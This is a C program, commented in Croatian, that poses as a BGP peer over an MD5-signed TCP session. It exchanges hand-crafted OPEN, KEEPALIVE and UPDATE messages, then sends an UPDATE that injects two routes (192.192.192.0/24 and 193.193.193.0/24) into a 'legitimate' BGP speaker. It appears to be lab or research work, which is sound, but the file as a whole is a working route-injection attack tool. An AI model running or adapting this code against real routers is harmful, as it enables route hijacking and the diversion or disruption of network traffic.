// BGP poruke mozes skuziti po message ID-i
// OPEN je 1
// KEEPALIVE je 4
// UPDATE je 2 itd

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <arpa/inet.h>

#define BUFFERSZ 256
struct tcp_md5sig md5;

static inline void error(char *msg) {

    perror(msg);

    exit(1);

}

int main(int argc, char *argv[]) 
{

    int sockfd, newsockfd, portno;
    socklen_t clilen;
    char buffer[BUFFERSZ], *key, *sip, *sport, *cip, *cport;
    struct sockaddr_in serv_addr, saddr, cli_addr;
    int n, r;
    char client_addr_ipv[100];
    
    char sendbuf[45]={
	0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
	0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
	//length
	0x00,0x2d,
	//type OPEN message
	0x01,
	//BGP version 4
	0x04,
	//AS=7675
	0x1d,0xfb,
	//holdtime=180
	0x00,0xb4,
	//BGP identifier=192.168.56.104
	0xc0,0xa8,0x38,0x68,
	//optional parameter length=16
	0x10,
	//the rest is optional paramter
	0x02,0x06,0x01,
	0x04,0x00,0x01,0x00,0x01,0x02,0x02,0x80,
	0x00,0x02,0x02,0x02,0x00};

   char keepalive[19]={
	0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
	0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
	//length
	0x00,0x13,
	//Type KEEPALIVE
	0x04};

   char update[23]={
	0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
	0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
	//length
	0x00,0x17,
	//type UPDATE
	0x02,
	//withdrawn routes length
	0x00,
	//total path attribute length
	0x00 };

   char update_change[60]={
	
	0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
	0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
	//length
	0x00,0x3c,
	//type UPDATE
	0x02,
	//withdrawn routes length
	0x00,0x00,
	//total path attribute length
	0x00,0x1d,
	//path attributes kopiram od originalnog BGP-a
	0x40,0x01,0x01,0x00,0x50,0x02,0x00,0x00,0x40,0x03,0x04,
	//next hop - important to be right IP (192.168.56.104)
	0xc0,0xa8,0x38,0x68,
	//the rest of BGP payload	
	0x80,0x04,0x04,0x00,0x00,0x00,0x00,
	0x40,0x05,0x04,0x00,0x00,0x00,0x64,
	//NLRI injects two iBGP routes- 192.192.192.0/24 and 193.193.193.193.0/24
	0x18,0xc0,0xc0,0xc0,
	0x18,0xc1,0xc1,0xc1};
	
    if (argc != 6) 
	{
        fprintf(stderr, "Usage: %s <server IP> <server port> "
                "<client IP> <client port> <MD5 key>\n",
                argv[0]);

        return -1;
 	}

    sip = argv[1];
    sport = argv[2];
    cip = argv[3];
    cport = argv[4];
    key = argv[5];

    printf("\nIP TCP Server (TCP_MD5SIG) ...\n");

    //Sockets Layer Call: socket()

    //sockfd= socket(AF_INET,SOCK_RAW,0);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0)

        error("ERROR opening socket");

    bzero((char *) &serv_addr, sizeof(serv_addr));

    portno = atoi(sport);

    serv_addr.sin_family = AF_INET;

    if(inet_pton(AF_INET, sip, &serv_addr.sin_addr) <= 0)

        error("ERROR on inet_pton");

    serv_addr.sin_port = htons(portno);

 
    //Sockets Layer Call: bind()

    if (bind(sockfd, (struct sockaddr *) &serv_addr,

                sizeof(serv_addr)) < 0)

        error("ERROR on binding");

 

    // Client sockaddr_in6 for TCPMD5_SIG

    memset(&saddr, '0', sizeof(saddr));

    saddr.sin_family = AF_INET;

    if(inet_pton(AF_INET, cip, &saddr.sin_addr)<=0)

        error("ERROR on inet_pton");

    saddr.sin_port = htons(atoi(cport));

    //memcpy(&md5.tcpm_addr, &saddr, sizeof(saddr));

    md5.tcpm_addr = *(struct sockaddr_storage *) &saddr;

    strcpy(md5.tcpm_key, key);

    md5.tcpm_keylen = strlen(key);

    if ((r = setsockopt(sockfd, IPPROTO_TCP, TCP_MD5SIG, &md5, sizeof(md5))) < 0)

        error("listen setsockopt TCP_MD5SIG");

 

    //Sockets Layer Call: listen()

    listen(sockfd, 5);

    clilen = sizeof(cli_addr);

 

    //Sockets Layer Call: accept()

    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

    if (newsockfd < 0)

        error("ERROR on accept");

 

    //Sockets Layer Call: inet_ntop()

    inet_ntop(AF_INET, &(cli_addr.sin_addr),client_addr_ipv, 100);

    printf("Incoming connection from client having IP address: %s\n",

            client_addr_ipv);

     memset(buffer,0, BUFFERSZ);

 
    //Sockets Layer Call: recv()

    n = recv(newsockfd, buffer, BUFFERSZ, 0);

    if (n < 0)

        error("ERROR reading from socket");

	printf ("received: %d bytes \n",n);
 	for (int a=0;a!=n;a++)
	printf ("Messag from client:%x\n",(unsigned char)buffer[a]);
	printf ("\n");
    //printf("Message from client: %s\n", buffer);

     //Sockets Layer Call: send()
    // sending properly structured BGP OPEN response

    n = send(newsockfd,sendbuf,45, 0);

    if (n < 0)

        error("ERROR writing to socket");

    //2nd round of receiving because I send proper BGP response above
 
    n = recv(newsockfd, buffer, BUFFERSZ, 0);

    if (n < 0)

        error("ERROR reading from socket");

	printf ("received: %d bytes \n",n);
 	for (int a=0;a!=n;a++)
	printf ("Message from client: %x\n",(unsigned char)buffer[a]);
    //printf("Message from client: %s\n", buffer);

    //Sockets Layer Call: close()
    //sneding properly structured KEEPALIVE message
    // keepalive je bitan, dolazi u parovima nakon svake poruke pa razmisli da ovaj dio izdvojis ko funkciju
    // keepalive salji samo ako je dolazni paket KEEPALIVE

    n = send(newsockfd,keepalive,19, 0);

    if (n < 0)

        error("ERROR writing to socket");

     n = recv(newsockfd, buffer, BUFFERSZ, 0);

	 if (n < 0)

        error("ERROR reading from socket");

	printf ("received: %d bytes \n",n);
 	for (int a=0;a!=n;a++)
	printf ("Message from client: %x\n",(unsigned char)buffer[a]);

   //sending properly structured UPDATE message
    n = send(newsockfd,update,23, 0);

    if (n < 0)

        error("ERROR writing to socket");
   
	  n = recv(newsockfd, buffer, BUFFERSZ, 0);

	 if (n < 0)

        error("ERROR reading from socket");

   printf ("received: %d bytes \n",n);
   for (int a=0;a!=n;a++)
   printf ("Message from client: %x\n",(unsigned char)buffer[a]);

    //e, cini se da moram sad poslati jos jedan keepalive da dobijem odgovor na update
    // ovo je bitno da utvrdis da li i kada treba slati keepalive

	  n = send(newsockfd,keepalive,19, 0);

    if (n < 0)

        error("ERROR writing to socket");

	printf ("received: %d bytes \n",n);
 	for (int a=0;a!=n;a++)
	printf ("Message from client: %x\n",(unsigned char)buffer[a]);

	
	//sending UPDATE message to update legitimate BGP

	   n = send(newsockfd,update_change,60, 0);

   	 if (n < 0)

        error("ERROR writing to socket");
   
	  n = recv(newsockfd, buffer, BUFFERSZ, 0);

	 if (n < 0)

        error("ERROR reading from socket");

while(1);
    
	close(sockfd);

    close(newsockfd);

 

    return 0;

}
